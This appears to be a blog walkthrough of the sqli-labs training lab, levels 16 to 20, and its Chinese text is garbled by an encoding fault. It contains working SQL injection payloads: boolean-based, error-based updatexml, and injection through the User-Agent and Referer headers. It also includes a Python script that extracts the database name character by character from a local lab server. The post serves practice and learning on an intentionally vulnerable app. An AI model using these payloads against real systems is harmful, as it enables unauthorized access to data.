---
layout: post
title: "sqli-labs-ç¬¬16å…³->ç¬¬20å…³"
subtitle: "sqli-labs-ç¬¬16å…³->ç¬¬20å…³"
date: 2019-09-03
author: ppbibo
category: security
finished: true
---
[TOC]

æ¥ç€ä¸Šç¯‡ï¼š[ä¼ é€é—¨](https://6o9.im/security/2019/08/30/sqli-labs-2.html)



## sqli-labs ç¬¬16å…³

å…ˆæŸ¥çœ‹æºä»£ç 

![sqli-labs-16](/static/img/sqli-labs-16.png)



ç›´æ¥é—­åˆæ‰å‰é¢çš„ **RTï¼š**

```bash
POSTï¼šhttp://192.168.1.102/sqli-labs/Less-16/

uname=a") or 1=1#
```

![sqli-labs-16-1](/static/img/sqli-labs-16-1.png)



è¾“å‡ºè„šæœ¬ **RT**ï¼š

```python

import requests

sql_url = "http://192.168.1.102/sqli-labs/Less-16/"

for j in range(9): # å‰é¢çŸ¥é“äº†æ•°æ®åº“é•¿åº¦ä¸º8ä½

    for i in range(97, 123):  # ascii ç å€¼ a-z : 97-122

        re = requests.request("POST",url=sql_url,data={"uname":"1\") or ord(mid((select database()),{},1))={}#".format(j,i),"passwd":"1"})

        if "flag.jpg" in re.text:

            print(chr(i))
```

![sqli-labs-16-2](/static/img/sqli-labs-16-2.png)



SQLè¯­å¥è§£æ

```mysql
1' or ord(mid((select database()),1,1))={}#

select database();  -- å½“å‰æ•°æ®åº“åç§° "security"
select mid((select database()),1,1);  -- mid() æˆªæ–­ä»ç¬¬ä¸€ä½å¾€åæˆªæ–­ä¸€ä¸ª "s"
select ord("s");    -- å°† "s" è½¬æ¢æˆascciç  115

print(chr(i))  # åœ¨pythonä¸­chræ–¹æ³•å°† "i" ascciç å€¼è½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦ã€‚
```



## sqli-labs ç¬¬17å…³

å…ˆçœ‹æºä»£ç  **RT:**

![sqli-labs-17](/static/img/sqli-labs-17.png)

![sqli-labs-17-1](/static/img/sqli-labs-17-1.png)



ç›´æ¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ **RT**ï¼š

```bash
uname=admin
passwd=1' or (updatexml(1,concat(0x3a,(select database())),1))#
```

![sqli-labs-17-2](/static/img/sqli-labs-17-2.png)



## sqli-labs ç¬¬18å…³

çœ‹æºç  **RT:**

![sqli-labs-18](/static/img/sqli-labs-18.png)

![sqli-labs-18-1](/static/img/sqli-labs-18-1.png)

ä¸Šé¢é¦–å…ˆuname å’Œ passwd å‚æ•°éƒ½è¿›è¡Œä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿›è¡Œäº†è´¦å·å¯†ç æ˜¯å¦æ­£ç¡®çš„åˆ¤æ–­ï¼Œæ­£ç¡®çš„è¯åˆ™å‘ uagents è¡¨ä¸‹æ’å…¥ä¸Šé¢æ¥æ”¶çš„ `$uagent` / `$IP` / `$uname` å…¶ä¸­ `$uagent` å’Œ `$IP` æ²¡æœ‰åšä»»ä½•çš„æ ¡éªŒï¼Œå¯ä»¥ç›´æ¥æ³¨å…¥ï¼Œå¦‚å›¾ï¼š

```bash
User-Agent: 1' or updatexml(1,concat(0x3a,(database())),0),'','')#
```

![sqli-labs-18-2](/static/img/sqli-labs-18-2.png)

  

## sqli-labs ç¬¬19å…³

æŸ¥çœ‹æºä»£ç 

![sqli-labs-19](/static/img/sqli-labs-19.png)

è·Ÿä¸Šä¸€å…³æ˜¯ä¸€æ ·çš„å”¯ä¸€ä¸åŒçš„ç‚¹æ˜¯ `$uagent` å˜é‡è·å–çš„æ˜¯ HTTP åè®®å¤´ `Referer` ï¼Œ

`$uagent` å’Œ `$ip` å˜é‡æ²¡æœ‰è¿›è¡Œä»»ä½•æ ¡éªŒï¼Œä¸¤ä¸ªéƒ½å¯ä»¥æ³¨å…¥ï¼Œè¿™é‡Œä½¿ç”¨`uagent`å‚æ•°æ¥ç¤ºèŒƒï¼Œï¼ˆ`$ip` å˜é‡è·å–çš„æ˜¯HTTPåè®®ä¸­çš„ `X-Forwarded-For` åè®®å¤´ ï¼‰**RT:**

```bash
Referer: 1' or updatexml(1,concat(0x3a,(database())),0),'','')#
```

![sqli-labs-19-1](/static/img/sqli-labs-19-1.png)



## sqli-labs ç¬¬20å…³

ç›´æ¥æŸ¥çœ‹æºä»£ç  **RT:**

![sqli-labs-20](/static/img/sqli-labs-20.png)

å‘ç°åšäº†ä¸¥æ ¼çš„æ ¡éªŒï¼Œæ‹¼æ¥çš„sqlä¸­å¹¶æ²¡æœ‰å‘ç°æ•æ„Ÿçš„å‚æ•°ï¼Œå‘ç°äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•

çœ‹ä¸‹å›¾ï¼š

![sqli-labs-20-1](/static/img/sqli-labs-20-1.png)



emmmm.... éƒ½æ‡‚å§ã€‚ã€‚ã€‚ç›´æ¥ä¸Šå›¾äº†ã€‚

![sqli-labs-20-2](/static/img/sqli-labs-20-2.png)

![sqli-labs-20-3](/static/img/sqli-labs-20-3.png)

![sqli-labs-20-4](/static/img/sqli-labs-20-4.png)



## æ€»ç»“

æ²¡å•¥æ€»ç»“çš„ï¼Œè®¤çœŸæ ¡éªŒä»»ä½•ä¸sqlè¯­å¥æ‹¼æ¥çš„å‚æ•°å¯æœ‰æ•ˆé˜²æ­¢SQLæ³¨å…¥çš„äº§ç”Ÿï¼Œå›å®¶åƒæ‰‹æŠ“é¥¼å»äº†ã€‚ğŸ˜





------

***ã€Œ è½¬è½½è¯·å£°æ˜åšå®¢åœ°å€åŠAPT086&QQæ„›å®‰å…¨å®éªŒå®¤ ã€***